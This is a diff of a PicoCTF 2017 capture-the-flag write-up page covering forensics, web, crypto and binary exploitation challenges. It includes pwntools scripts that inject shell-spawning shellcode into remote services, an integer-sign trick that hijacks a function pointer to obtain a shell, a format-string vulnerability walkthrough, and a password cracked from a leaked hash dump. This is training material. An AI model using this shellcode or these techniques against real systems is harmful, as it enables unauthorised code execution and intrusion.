@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <title>PicoCTF 2017</title>
-<!-- 2017-09-01 Fri 22:22 -->
+<!-- 2017-09-04 Mon 15:49 -->
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="generator" content="Org-mode">
@@ -189,10 +189,106 @@ $(function() {
     $('.bs-docs-sidebar').affix();
 });
 </script>
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  displayAlign: "center",
+  displayIndent: "2em",
+  messageStyle: "none",
+  "HTML-CSS": {
+    scale: 100,
+    styles: {
+      ".MathJax_Display": {
+        "font-size": "100%"
+      }
+    }
+  },
+  "SVG": {
+    scale: 100,
+    styles: {
+      ".MathJax_SVG_Display": {
+        "font-size": "100%",
+        "margin-left": "-2.281em"
+      }
+    }
+  }
+});
+</script>
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_SVG"></script>
 </head>
 <body>
 <div id="content" class="container">
 <div class="row"><div class="col-md-9"><h1 class="title">PicoCTF 2017</h1>
+<p>
+-*- mode: Org; org-download-image-dir: "~/Dropbox/bi0s/pico2017/screenshoot"; -*-
+</p>
+
+<link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet"> 
+<style type="text/css">
+.h3, h3 {
+    font-size: 25px;
+    padding: 10px
+}
+.h4, h4 {
+    font-size: 21px;
+    padding: 22px
+}
+
+/* All levels of nav */
+.bs-docs-sidebar .nav > li > a {
+    display: block;
+    padding: 4px 20px;
+    font-size: 14px;
+    font-weight: 500;
+    color: #999;
+}
+.bs-docs-sidebar .nav > li > a:hover,
+.bs-docs-sidebar .nav > li > a:focus {
+    padding-left: 19px;
+    color: #2bbc8a;
+ text-decoration: none;
+    background-color: transparent;
+    border-left: 1px solid #2bbc8a;
+ }
+.bs-docs-sidebar .nav > .active > a,
+.bs-docs-sidebar .nav > .active:hover > a,
+.bs-docs-sidebar .nav > .active:focus > a {
+    padding-left: 18px;
+    font-weight: bold;
+    color: #2bbc8a;
+    background-color: transparent;
+    border-left: 2px solid #2bbc8a;
+ }
+body {
+color: #c9cacc;
+background-color: #1d1f21;
+font-family: "Source Code Pro" , "Menlo", "Meslo LG", monospace;
+}
+a {
+	color: #2bbc8a;
+	text-decoration: none;
+}
+a:focus, a:hover {
+	color: #2bbc8a;
+	text-decoration: underline;
+}
+pre {
+	color: #d1d9e1;
+	background-color: #212326;
+	padding-left: 40px;
+	padding-top: 20px;
+	padding-bottom: 20px;
+        border: 1px solid #212326;
+font-family: "Source Code Pro" , "Menlo", "Meslo LG", monospace;
+}
+code {
+	background-color: #212326;
+}
+footer {
+	background-color: #212326;
+}
+</style>
+
 <div id="outline-container-sec-1" class="outline-2">
 <h2 id="sec-1"><span class="section-number-2">1</span> Level 1</h2>
 <div class="outline-text-2" id="text-1">
@@ -206,9 +302,11 @@ $(function() {
 Link : <a href="https://2017game.picoctf.com/game/level-1/challenge/Digital-Camouflage">Digital Camouflage</a>
 </p>
 
+<blockquote>
 <p>
 We need to gain access to some routers. Let's try and see if we can find the password in the captured network data : <a href="./data.pcap">data.pcap</a>
 </p>
+</blockquote>
 
 <p>
 Hint :
@@ -263,16 +361,19 @@ KN1Z6PXVy9
 Link : <a href="https://2017game.picoctf.com/game/level-1/challenge/Special-Agent-User">Special Agent User</a> 
 </p>
 
+<blockquote>
 <p>
 We can get into the Administrator's computer with a browser exploit. But first, we need to figure out what browser they're using.
 Perhaps this information is located in a network packet capture we took: <a href="./data1.pcap">data.pcap</a>
 Enter the browser and version as "BrowserName BrowserVersion". NOTE: We're just looking for up to 3 levels of subversions for
 the browser version (ie. Version 1.2.3 for Version 1.2.3.4) and ignore any 0th subversions (ie. 1.2 for 1.2.0)
 </p>
+</blockquote>
 
 <p>
 Hint :
 </p>
+
 <blockquote>
 <p>
 Where can we find information on the browser in networking data? Maybe <a href="http://www.useragentstring.com./">try reading up on user-agent strings</a>
@@ -324,10 +425,12 @@ Which tells that the browser is Chrome version 35.0.2117
 Link:<a href="https://2017game.picoctf.com/game/level-1/challenge/Bash-Loop">bash loop</a>
 </p>
 
+<blockquote>
 <p>
 We found a program that is hiding a flag but requires you to guess the number it is thinking of. Chances are Linux has an easy
 way to try all the numbers&#x2026; Go to /problems/69a376443853a8d385877f60375188bf and try it out!
 </p>
+</blockquote>
 
 <p>
 Solution :
@@ -378,9 +481,11 @@ Yay! That's the number! Here be the flag: 249808e7eba907b7e323f4f2fff2406d
 Link : <a href="https://2017game.picoctf.com/game/level-1/challenge/Just-No">just no</a>
 </p>
 
+<blockquote>
 <p>
 A program at /problems/276fc27f3ef921f0e2f0f75ba95c9e60 has access to a flag but refuses to share it. Can you convince it otherwise?
 </p>
+</blockquote>
 
 <p>
 Hint :
@@ -470,10 +575,12 @@ Oh. Well the auth file doesn't say no anymore so... Here's the flag: 8661ca23ef6
 Link : <a href="https://2017game.picoctf.com/game/level-1/challenge/Hex2Raw">hex2raw</a>
 </p>
 
+<blockquote>
 <p>
 This program requires some unprintable characters as input&#x2026; But how do you print unprintable characters? CLI yourself to 
 /problems/c69bcda4ca5a28fd9d18790fc763db73 and turn that Hex2Raw!
 </p>
+</blockquote>
 
 <p>
 Running hex2raw program gives
@@ -513,10 +620,12 @@ Yay! That's what I wanted! Here be the flag:
 Link : <a href="https://2017game.picoctf.com/game/level-1/challenge/Raw2Hex">raw2hex</a>
 </p>
 
+<blockquote>
 <p>
 This program just prints a flag in raw form. All we need to do is convert the output to hex and we have it! CLI yourself to 
 /problems/7ed72aec10a93d978ec3542055975d36 and turn that Raw2Hex!
 </p>
+</blockquote>
 
 <p>
 Solution :
@@ -551,7 +660,16 @@ And the flag is the  <code>233a338f3052fec75f009f2485ac5352</code>  hex
 <div class="outline-text-4" id="text-1-4-1">
 <p>
 Link : <a href="https://2017game.picoctf.com/game/level-1/challenge/What-Is-Web">what is web</a>
+</p>
+
+<blockquote>
+<p>
 Someone told me that some guy came up with the "World Wide Web", using "HTML" and "stuff". Can you help me figure out what that is?  <a href="http://shell2017.picoctf.com:4443/">webpage</a>
+</p>
+</blockquote>
+
+<p>
+Solution: 
 </p>
 
 <p>
@@ -579,8 +697,46 @@ flag : 72b28b258d2b2ea021486fddd5020451d
 </p>
 </div>
 </div>
+<div id="outline-container-sec-1-4-2" class="outline-4">
+<h4 id="sec-1-4-2"><span class="section-number-4">1.4.2</span> Lazy Dev</h4>
+<div class="outline-text-4" id="text-1-4-2">
+<p>
+Link : <a href="https://2017game.picoctf.com/game/level-1/challenge/Lazy-Dev">Lazy-Dev</a> 
+</p>
+
+<blockquote>
+<p>
+I really need to login to this <a href="http://shell2017.picoctf.com:37907/">website</a>, but the developer hasn't implemented login yet. Can you help?
+</p>
+</blockquote>
+
+
+
+<p>
+Hint : 
+</p>
+
+<blockquote>
+<p>
+Where does the password check actually occur?
+Can you interact with the javascript directly?
+</p>
+</blockquote>
+
+<p>
+Solution : 
+</p>
+
+
+<figure>
+<p><img src="screenshoot/Level 1/screenshot_2017-09-04_15-48-56.png" class="img-responsive" alt="screenshot_2017-09-04_15-48-56.png">
+</p>
+</figure>
 </div>
 </div>
+</div>
+</div>
+
 <div id="outline-container-sec-2" class="outline-2">
 <h2 id="sec-2"><span class="section-number-2">2</span> Level 2</h2>
 <div class="outline-text-2" id="text-2">
@@ -594,11 +750,13 @@ flag : 72b28b258d2b2ea021486fddd5020451d
 Link : <a href="https://2017game.picoctf.com/game/level-2/challenge/Meta-Find-Me">Meta-Find-Me</a>
 </p>
 
+<blockquote>
 <p>
 Find the location of the flag in the image: <a href="./image.jpg">image.jpg</a> Note: Latitude and longitude values are in degrees with no degree symbols,
 /direction letters, minutes, seconds, or periods. They should only be digits. The flag is not just a set of coordinates - if 
 you think that, keep looking!
 </p>
+</blockquote>
 
 <p>
 Hint : 
@@ -641,9 +799,11 @@ flag<sub>2</sub><sub>meta</sub><sub>4</sub><sub>me</sub><sub>7</sub><sub>96</sub
 Link : <a href="https://2017game.picoctf.com/game/level-2/challenge/Little-School-Bus">Little-School-Bus</a> 
 </p>
 
+<blockquote>
 <p>
 Can you help me find the data in this <a href="./littleschoolbus.bmp">littleschoolbus.bmp</a>
 </p>
+</blockquote>
 
 <p>
 Hint :
@@ -760,6 +920,135 @@ Footnote :
 </ol>
 </div>
 </div>
+<div id="outline-container-sec-2-1-3" class="outline-4">
+<h4 id="sec-2-1-3"><span class="section-number-4">2.1.3</span> Missing Identity</h4>
+<div class="outline-text-4" id="text-2-1-3">
+<p>
+Link : <a href="https://2017game.picoctf.com/game/level-2/challenge/Missing-Identity">Missing-Identity</a>
+</p>
+
+<blockquote>
+<p>
+Turns out, some of the files back from Master Challenge 1 were corrupted. Restore this one <a href="./file/file">file</a>  and find the flag 
+Update 16:26 EST 1 Apr If you feel that you are close, make a private piazza post with what you have, and an admin will help out. 
+The flag starts with the character z.
+</p>
+</blockquote>
+
+<p>
+Hint : 
+</p>
+
+<blockquote>
+<p>
+What file is this?
+What do you expect to find in the file structure?
+All characters in the file are lower case or numberical. There will not be any zeros.
+</p>
+</blockquote>
+
+<p>
+Solution :
+</p>
+
+<p>
+Running file command gives it is data ,
+</p>
+<pre class="example">
+xxd file 
+</pre>
+
+<pre class="example">
+00000000: 5858 5858 5858 0000 0800 2344 7f4a 6a58  XXXXXX....#D.JjX
+00000010: bd98 b48c 0000 a58c 0000 0800 0000 666c  ..............fl
+00000020: 6167 2e70 6e67 004e 40b1 bf89 504e 470d  ag.png.N@...PNG.
+00000030: 0a1a 0a00 0000 0d49 4844 5200 0002 7300  .......IHDR...s.
+00000040: 0000 3c08 0200 0000 8243 abc9 0000 8c6c  ..&lt;......C.....l
+00000050: 4944 4154 789c dcfd 5793 ad5b 771e 868d  IDATx...W..[w...
+00000060: 31d3 1b56 eab8 e3d9 277e 1120 1820 4022  1..V....'~. . @"
+00000070: 4c52 8698 4452 b264 89a6 252b dcb8 5c2e  LR..DR.d..%+..\.
+00000080: 5fb9 6cdf e80f f846 572e 5fd8 55ae 7239  _.l....FW._.U.r9
+00000090: 48b6 cb14 254b b224 a254 2241 db22 0951  H...%K.$.T"A.".Q
+
+....
+
+00068ec0: 00a4 8100 0000 0066 6c61 672e 706e 6750  .......flag.pngP
+00068ed0: 4b01 0214 0314 0000 0008 0023 447f 4a50  K..........#D.JP
+00068ee0: 9769 035a ed00 0058 ed00 000f 0000 0000  .i.Z...X........
+00068ef0: 0000 0000 0000 00a4 81da 8c00 006e 6f74  .............not
+00068f00: 7468 6566 6c61 6731 2e70 6e67 504b 0102  theflag1.pngPK..
+00068f10: 1403 1400 0000 0800 2344 7f4a 4773 f028  ........#D.JGs.(
+00068f20: cfd4 0000 bbd4 0000 0f00 0000 0000 0000  ................
+00068f30: 0000 0000 a481 617a 0100 6e6f 7474 6865  ......az..notthe
+00068f40: 666c 6167 322e 706e 6750 4b01 0214 0314  flag2.pngPK.....
+00068f50: 0000 0008 0023 447f 4a51 a5e2 980d ea00  .....#D.JQ......
+00068f60: 00fd e900 000f 0000 0000 0000 0000 0000  ................
+00068f70: 00a4 815d 4f02 006e 6f74 7468 6566 6c61  ...]O..notthefla
+00068f80: 6733 2e70 6e67 504b 0102 1403 1400 0000  g3.pngPK........
+00068f90: 0800 2344 7f4a e1ca f91d 72ba 0000 63ba  ..#D.J....r...c.
+00068fa0: 0000 0f00 0000 0000 0000 0000 0000 a481  ................
+00068fb0: 9739 0300 6e6f 7474 6865 666c 6167 342e  .9..nottheflag4.
+00068fc0: 706e 6750 4b01 0214 0314 0000 0008 0023  pngPK..........#
+00068fd0: 447f 4a6c fcad 133b e600 0027 e600 000f  D.Jl...;...'....
+00068fe0: 0000 0000 0000 0000 0000 00a4 8136 f403  .............6..
+00068ff0: 006e 6f74 7468 6566 6c61 6735 2e70 6e67  .nottheflag5.png
+00069000: 504b 0102 1403 1400 0000 0800 2344 7f4a  PK..........#D.J
+00069010: 7663 94c0 f5c1 0000 19c2 0000 0f00 0000  vc..............
+00069020: 0000 0000 0000 0000 a481 9eda 0400 6e6f  ..............no
+00069030: 7474 6865 666c 6167 362e 706e 6750 4b01  ttheflag6.pngPK.
+00069040: 0214 0314 0000 0008 0023 447f 4aa7 207a  .........#D.J. z
+00069050: 1eac f100 0098 f100 000f 0000 0000 0000  ................
+00069060: 0000 0000 00a4 81c0 9c05 006e 6f74 7468  ...........notth
+00069070: 6566 6c61 6737 2e70 6e67 504b 0506 0000  eflag7.pngPK....
+00069080: 0000 0800 0800 e101 0000 998e 0600 0000  ................
+</pre>
+
+<p>
+The intersting part is in the begenning XXXXXX  suggest that it is related to magic bit . these bytes specifies what format the file is . 
+Every file format has a uniq bit which specifes that file format , program use there to identify file format . the end of xxd output 
+shows many file name which gives a hint that is a compressed file . ZIP has a four byte magic bit 
+</p>
+
+<blockquote>
+<p>
+Zip Archive   "PK.."    0x50 0x4B 0x03 0x04
+</p>
+</blockquote>
+
+<p>
+Changing the hex with hex editor 
+</p>
+
+<pre class="example">
+00000000: 504b 0304 0000 0000 0800 2344 7f4a 6a58  PK........#D.JjX
+00000010: bd98 b48c 0000 a58c 0000 0800 0000 666c  ..............fl
+00000020: 6167 2e70 6e67 004e 40b1 bf89 504e 470d  ag.png.N@...PNG.
+00000030: 0a1a 0a00 0000 0d49 4844 5200 0002 7300  .......IHDR...s.
+00000040: 0000 3c08 0200 0000 8243 abc9 0000 8c6c  ..&lt;......C.....l
+00000050: 4944 4154 789c dcfd 5793 ad5b 771e 868d  IDATx...W..[w...
+00000060: 31d3 1b56 eab8 e3d9 277e 1120 1820 4022  1..V....'~. . @"
+00000070: 4c52 8698 4452 b264 89a6 252b dcb8 5c2e  LR..DR.d..%+..\.
+00000080: 5fb9 6cdf e80f f846 572e 5fd8 55ae 7239  _.l....FW._.U.r9
+00000090: 48b6 cb14 254b b224 a254 2241 db22 0951  H...%K.$.T"A.".Q
+</pre>
+
+<p>
+unzip the file the flag.png gives the flag 
+</p>
+
+
+<figure>
+<p><img src="./file/flag.png" class="img-responsive" alt="flag.png">
+</p>
+</figure>
+
+
+<p>
+Footnote :
+<a href="https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/">https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/</a>
+</p>
+</div>
+</div>
 </div>
 <div id="outline-container-sec-2-2" class="outline-3">
 <h3 id="sec-2-2"><span class="section-number-3">2.2</span> Cryptography</h3>
@@ -771,10 +1060,12 @@ Footnote :
 Link : <a href="https://2017game.picoctf.com/game/level-2/challenge/SoRandom">SoRandom</a>
 </p>
 
+<blockquote>
 <p>
 We found <a href="./sorandom.py">sorandom.py</a> running at shell2017.picoctf.com:27691. It seems to be outputting the flag but randomizing all the characters first. 
 Is there anyway to get back the original flag?
 </p>
+</blockquote>
 
 <p>
 Hint: 
@@ -828,11 +1119,11 @@ Unguessably Randomized Flag: BNZQ:20380043pc5p8u861tcy650q8xn8mf5d
 <p>
 Analysing the python script tells us that it uses the random python module to generate random digit to rotate the input, the seed for the
 radom generator is "random" . But this random generator is not completly random decause with the knowlage of the seed we can predict the 
-radom number generated i the i th iteration of the funtion .  
+radom number generated in i th iteration of the funtion .  
 </p>
 
 <p>
-Creting a scipt to break this encryption 
+Creating  a scipt to break this encryption 
 </p>
 
 <div class="org-src-container">
@@ -882,9 +1173,747 @@ FLAG:96109120ba8d1c844afe294c3cd1eb4c
 </blockquote>
 </div>
 </div>
+<div id="outline-container-sec-2-2-2" class="outline-4">
+<h4 id="sec-2-2-2"><span class="section-number-4">2.2.2</span> LeakedHashes</h4>
+<div class="outline-text-4" id="text-2-2-2">
+<p>
+Link : <a href="https://2017game.picoctf.com/game/level-2/challenge/LeakedHashes">LeakedHashes</a>
+</p>
+
+<blockquote>
+<p>
+Someone got hacked! Check out some service's password hashes that were leaked at <a href="./hashdump.txt">hashdump.txt</a> Do you think they chose strong passwords?  
+We should check&#x2026; The service is running at shell2017.picoctf.com:3815!
+</p>
+</blockquote>
+
+<p>
+Hint :
+</p>
+<blockquote>
+<p>
+See if you can crack any of the login credentials and then connect to the service as one of the users. What's the chance these hashes 
+have actually already been broken by someone else? Are there websites that host those cracked hashes? Connect from the shell with nc.
+</p>
+</blockquote>
+
+<p>
+Solution : 
+</p>
+
+<p>
+We can crack this md5 hashes with online services  <a href="https://crackstation.net/">https://crackstation.net/</a> , This site allows of cracking of 20 entries 
+</p>
+
+
+<blockquote>
+<p>
+christene:89689941d40794e311ef8bc7061b9944    : 7h1ck
+</p>
+</blockquote>
+
+<p>
+After cracking the hash just login with the username and password to get the flag
+</p>
+
+<blockquote>
+<p>
+flag is 4f36a002cc953e6567a878758abc8cf9
+</p>
+</blockquote>
+</div>
+</div>
+</div>
+<div id="outline-container-sec-2-3" class="outline-3">
+<h3 id="sec-2-3"><span class="section-number-3">2.3</span> Binary Exploitation</h3>
+<div class="outline-text-3" id="text-2-3">
+</div><div id="outline-container-sec-2-3-1" class="outline-4">
+<h4 id="sec-2-3-1"><span class="section-number-4">2.3.1</span> Shellz</h4>
+<div class="outline-text-4" id="text-2-3-1">
+<p>
+Link : <a href="https://2017game.picoctf.com/game/level-2/challenge/Shellz">Shellz</a>
+</p>
+
+<blockquote>
+<p>
+You no longer have an easy thing to call, but you have more space. Program: <a href="./shellz">shellz!</a>  <a href="./shellz.c">Source</a> . Connect on shell2017.picoctf.com:49324.
+</p>
+</blockquote>
+
+<p>
+Hint :
+</p>
+<blockquote>
+<p>
+There is a bunch of preexisting shellcode already out there!
+</p>
+</blockquote>
+
+<p>
+Solution :
+</p>
+
+<p>
+The program reads 40 bytes and executes these binary , So we need to inject shell code of length less than 40 bytes
+</p>
+
+<p>
+This is a shell code from <a href="https://www.exploit-db.com/exploits/36395/">explit-db</a>
+</p>
+<blockquote>
+<p>
+"\x31\xd2\x52\xb8\xb7\xd8\x3e\x56\x05\x78\x56\x34\x12\x50\xb8\xde\xc0\xad"
+"\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd"
+"\x80\x96\xcd\x80"
+</p>
+</blockquote>
+
+<p>
+Exploit Code 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #859900;">from</span> pwn <span style="color: #859900;">import</span> *
+
+<span style="color: #268bd2;">host</span> = <span style="color: #2aa198;">"shell2017.picoctf.com"</span>
+<span style="color: #268bd2;">port</span> = <span style="color: #2aa198;">"49324"</span>
+
+<span style="color: #586e75; font-style: italic;">#</span><span style="color: #586e75; font-style: italic;">shellcode which spawn shell</span>
+<span style="color: #268bd2;">shellcode</span> = <span style="color: #2aa198;">"\x31\xd2\x52\xb8\xb7\xd8\x3e\x56\x05\x78\x56\x34\x12\x50\xb8\xde\xc0\xad\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd\x80\x96\xcd\x80"</span>
+
+<span style="color: #268bd2;">io</span> = remote(host, port)  <span style="color: #586e75; font-style: italic;"># </span><span style="color: #586e75; font-style: italic;">Connect to the server</span>
+io.recvuntil(<span style="color: #2aa198;">"Give me 40 bytes:\n"</span>)  
+io.sendline(shellcode)  <span style="color: #586e75; font-style: italic;"># </span><span style="color: #586e75; font-style: italic;">Sends the shellcode</span>
+io.sendline(<span style="color: #2aa198;">'cat flag.txt'</span>)
+<span style="color: #859900;">print</span> <span style="color: #2aa198;">"Flag : "</span>,
+<span style="color: #859900;">print</span>(io.readline())
+io.close()
+
+</pre>
+</div>
+
+<p>
+Which Gives the Flag !
+</p>
+<blockquote>
+<p>
+51e2978e4e59013145c2613f01185802
+</p>
+</blockquote>
 </div>
 </div>
 
+<div id="outline-container-sec-2-3-2" class="outline-4">
+<h4 id="sec-2-3-2"><span class="section-number-4">2.3.2</span> Shells</h4>
+<div class="outline-text-4" id="text-2-3-2">
+<p>
+Link : <a href="https://2017game.picoctf.com/game/level-2/challenge/Shells">shells</a>
+</p>
+
+<p>
+How much can a couple bytes do? Use <a href="./shells">shells!</a> <a href="./shells.c">Source</a> . Connect on shell2017.picoctf.com:40976
+</p>
+
+<p>
+Hint :
+</p>
+<blockquote>
+<p>
+Read about basic shellcode
+You don't need a full shell (yet&#x2026;), just enough to get the flag
+</p>
+</blockquote>
+
+<p>
+Solution :
+</p>
+
+<p>
+We have to write basic shell code to call win funtion 
+</p>
+
+<p>
+Exploit code 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #859900;">from</span> pwn <span style="color: #859900;">import</span> *
+
+<span style="color: #268bd2;">host</span> = <span style="color: #2aa198;">"shell2017.picoctf.com"</span>
+<span style="color: #268bd2;">port</span> = <span style="color: #2aa198;">"40976"</span>
+
+context(arch=<span style="color: #2aa198;">"i386"</span>, os=<span style="color: #2aa198;">'linux'</span>)
+
+<span style="color: #268bd2;">payload</span> = <span style="color: #2aa198;">'''</span>
+<span style="color: #2aa198;">/* call vuln funtion */</span>
+<span style="color: #2aa198;">mov eax, 0x08048540</span>
+<span style="color: #2aa198;">call eax </span>
+<span style="color: #2aa198;">'''</span>
+
+
+<span style="color: #268bd2;">io</span> = remote(host, port)
+io.recvuntil(<span style="color: #2aa198;">"Give me 10 bytes:"</span>)
+io.sendline(asm(payload))
+<span style="color: #859900;">print</span>(io.readall())
+io.close()
+
+</pre>
+</div>
+
+<p>
+which gives the flag!
+</p>
+
+<blockquote>
+<p>
+cd875b6ffb5cdd3319532d52ceca71aa
+</p>
+</blockquote>
+</div>
+</div>
+
+<div id="outline-container-sec-2-3-3" class="outline-4">
+<h4 id="sec-2-3-3"><span class="section-number-4">2.3.3</span> Guess The Number</h4>
+<div class="outline-text-4" id="text-2-3-3">
+<p>
+Link : <a href="https://2017game.picoctf.com/game/level-2/challenge/Guess-The-Number">Guess-the-Number</a> 
+</p>
+
+<blockquote>
+<p>
+Just a simple number-guessing game. How hard could it be? <a href="./guess_num">Binary</a> <a href="./guess_num.c">Source.</a> Connect on shell2017.picoctf.com:20545.
+</p>
+</blockquote>
+
+<p>
+Hint : 
+</p>
+<blockquote>
+<p>
+What is the program doing with your input number?
+strtol checks for overflow, but it does allow negative numbers&#x2026;
+</p>
+</blockquote>
+
+<p>
+Solution :
+</p>
+
+<p>
+Lets look at the souce code 
+</p>
+<div class="org-src-container">
+
+<pre class="src src-C"><span style="color: #586e75; font-style: italic;">/* </span><span style="color: #586e75; font-style: italic;">How well do you know your numbers? </span><span style="color: #586e75; font-style: italic;">*/</span>
+
+<span style="color: #cb4b16;">#include</span> <span style="color: #2aa198;">&lt;stdio.h&gt;</span>
+<span style="color: #cb4b16;">#include</span> <span style="color: #2aa198;">&lt;stdlib.h&gt;</span>
+<span style="color: #cb4b16;">#include</span> <span style="color: #2aa198;">&lt;stdint.h&gt;</span>
+
+<span style="color: #b58900;">void</span> <span style="color: #268bd2;">win</span>(<span style="color: #b58900;">void</span>) {
+    printf(<span style="color: #2aa198;">"Congratulations! Have a shell:\n"</span>);
+    system(<span style="color: #2aa198;">"/bin/sh -i"</span>);
+}
+
+<span style="color: #b58900;">int</span> <span style="color: #268bd2;">main</span>(<span style="color: #b58900;">int</span> <span style="color: #268bd2;">argc</span>, <span style="color: #b58900;">char</span> **<span style="color: #268bd2;">argv</span>) {
+    <span style="color: #b58900;">uintptr_t</span> <span style="color: #268bd2;">val</span>;
+    <span style="color: #b58900;">char</span> <span style="color: #268bd2;">buf</span>[32] = <span style="color: #2aa198;">""</span>;
+
+    <span style="color: #586e75; font-style: italic;">/* </span><span style="color: #586e75; font-style: italic;">Turn off buffering so we can see output right away </span><span style="color: #586e75; font-style: italic;">*/</span>
+    setbuf(stdout, <span style="color: #2aa198;">NULL</span>);
+
+    printf(<span style="color: #2aa198;">"Welcome to the number guessing game!\n"</span>);
+    printf(<span style="color: #2aa198;">"I'm thinking of a number. Can you guess it?\n"</span>);
+    printf(<span style="color: #2aa198;">"Guess right and you get a shell!\n"</span>);
+
+    printf(<span style="color: #2aa198;">"Enter your number: "</span>);
+    scanf(<span style="color: #2aa198;">"%32s"</span>, buf);
+    val = strtol(buf, <span style="color: #2aa198;">NULL</span>, 10);
+
+    printf(<span style="color: #2aa198;">"You entered %d. Let's see if it was right...\n"</span>, val);
+
+    val &gt;&gt;= 4;
+    ((<span style="color: #b58900;">void</span> (*)(<span style="color: #b58900;">void</span>))val)();
+}
+</pre>
+</div>
+
+<p>
+From the souce we can see that the address in val is called at last , so we need to get the adress of the funtion win into <code>val</code> . 
+Interger from the input is stored into the variable with the funtion <code>strtol() : convert a string to a long integer</code> , Then 4 byte is is shifted to right 
+</p>
+
+
+<div class="org-src-container">
+
+<pre class="src src-shell">objdump -d guess_num
+</pre>
+</div>
+
+<p>
+gives the address of  win as <code>0x0804852b</code> which is 134513963 , when giving this to output the address called is 0x804852, 
+This is because of the shift operator
+</p>
+<pre class="example">
+&gt;&gt;&gt; 0x0804852b
+134513963
+&gt;&gt;&gt; bin(134513963)
+'0b1000000001001000010100101011'
+&gt;&gt;&gt; hex(0b100000000100100001010010)
+'0x804852'
+</pre>
+<p>
+So we need to input larger number , lets give <code>0x0804852bb</code> which is <code>2152223419</code> , but the value stored in the memory was <code>0x7ffffff</code> , 
+this happend because of the overflow  0x0804852bb &gt; 2 ** 31 - 1 .
+</p>
+
+<p>
+I spend some time here without seeing the hint saying about negative numbers . How negative numbers are stored in computer , One of the 
+fundemental idea complement notaion . So now we need to find a negarive number . Two's complement of <code>0x0804852bb</code> is <code>-2142743877</code> . 
+</p>
+
+
+<p>
+Which gives the Flag !
+</p>
+<pre class="example">
+Welcome to the number guessing game!
+I'm thinking of a number. Can you guess it?
+Guess right and you get a shell!
+Enter your number: -2142743877
+You entered -2142743877. Let's see if it was right...
+Congratulations! Have a shell:
+/bin/sh: 0: can't access tty; job control turned off
+$ cat flag.txt
+181db5615729e295ea7a5d5773c3829b
+</pre>
+
+<p>
+Footnote :
+</p>
+
+<ol class="org-ol">
+<li><a href="http://www.exploringbinary.com/twos-complement-converter/">http://www.exploringbinary.com/twos-complement-converter/</a>
+</li>
+</ol>
+</div>
+</div>
+
+<div id="outline-container-sec-2-3-4" class="outline-4">
+<h4 id="sec-2-3-4"><span class="section-number-4">2.3.4</span> Ive Got A Secret</h4>
+<div class="outline-text-4" id="text-2-3-4">
+<p>
+Link : <a href="https://2017game.picoctf.com/game/level-2/challenge/Ive-Got-A-Secret">Ive-Got-A-Secret</a> 
+</p>
+
+<blockquote>
+<p>
+Hopefully you can find the right format for my <a href="./secret">secret!</a> <a href="./secret.c">Source.</a> Connect on shell2017.picoctf.com:42684.
+</p>
+</blockquote>
+
+<p>
+Hint : 
+</p>
+<blockquote>
+<p>
+This is a beginning format string attack.
+</p>
+</blockquote>
+
+<p>
+Solution : 
+</p>
+
+<p>
+The souce contains a format string vulnarability @
+</p>
+<div class="org-src-container">
+
+<pre class="src src-c">printf(<span style="color: #2aa198;">"Give me something to say!\n"</span>);
+fflush(stdout);
+fgets(buffer, BUF_LEN, stdin);
+printf(buffer);  <span style="color: #586e75; font-style: italic;">/*</span><span style="color: #586e75; font-style: italic;">&lt;-- Here</span><span style="color: #586e75; font-style: italic;">*/</span>
+</pre>
+</div>
+
+<p>
+Executing gives 
+</p>
+<pre class="example">
+Give me something to say!
+HI
+HI
+Now tell my secret in hex! Secret: d
+As my friend says,"You get nothing! You lose! Good day, Sir!"
+</pre>
+
+<p>
+Lets look at the source 
+</p>
+<div class="org-src-container">
+
+<pre class="src src-C"><span style="color: #cb4b16;">#include</span> <span style="color: #2aa198;">&lt;stdio.h&gt;</span>
+<span style="color: #cb4b16;">#include</span> <span style="color: #2aa198;">&lt;fcntl.h&gt;</span>
+<span style="color: #cb4b16;">#include</span> <span style="color: #2aa198;">&lt;unistd.h&gt;</span>
+<span style="color: #cb4b16;">#include</span> <span style="color: #2aa198;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #cb4b16;">#define</span> <span style="color: #268bd2;">BUF_LEN</span> 64
+<span style="color: #b58900;">char</span> <span style="color: #268bd2;">buffer</span>[BUF_LEN];
+
+<span style="color: #b58900;">int</span> <span style="color: #268bd2;">main</span>(<span style="color: #b58900;">int</span> <span style="color: #268bd2;">argc</span>, <span style="color: #b58900;">char</span>** <span style="color: #268bd2;">argv</span>) {
+    <span style="color: #b58900;">int</span> <span style="color: #268bd2;">fd</span> = open(<span style="color: #2aa198;">"/dev/urandom"</span>, O_RDONLY);
+    <span style="color: #859900;">if</span>(fd == -1){
+        puts(<span style="color: #2aa198;">"Open error on /dev/urandom. Contact an admin\n"</span>);
+        <span style="color: #859900;">return</span> -1;
+    }
+    <span style="color: #b58900;">int</span> <span style="color: #268bd2;">secret</span>;
+    <span style="color: #859900;">if</span>(read(fd, &amp;secret, <span style="color: #859900;">sizeof</span>(<span style="color: #b58900;">int</span>)) != <span style="color: #859900;">sizeof</span>(<span style="color: #b58900;">int</span>)){
+        puts(<span style="color: #2aa198;">"Read error. Contact admin!\n"</span>);
+        <span style="color: #859900;">return</span> -1;
+    }
+    close(fd);
+    printf(<span style="color: #2aa198;">"Give me something to say!\n"</span>);
+    fflush(stdout);
+    fgets(buffer, BUF_LEN, stdin);
+    printf(buffer);
+
+    <span style="color: #b58900;">int</span> <span style="color: #268bd2;">not_secret</span>;
+    printf(<span style="color: #2aa198;">"Now tell my secret in hex! Secret: "</span>);
+    fflush(stdout);
+    scanf(<span style="color: #2aa198;">"%x"</span>, &amp;not_secret);
+    <span style="color: #859900;">if</span>(secret == not_secret){
+        puts(<span style="color: #2aa198;">"Wow, you got it!"</span>);
+        system(<span style="color: #2aa198;">"cat ./flag.txt"</span>);   
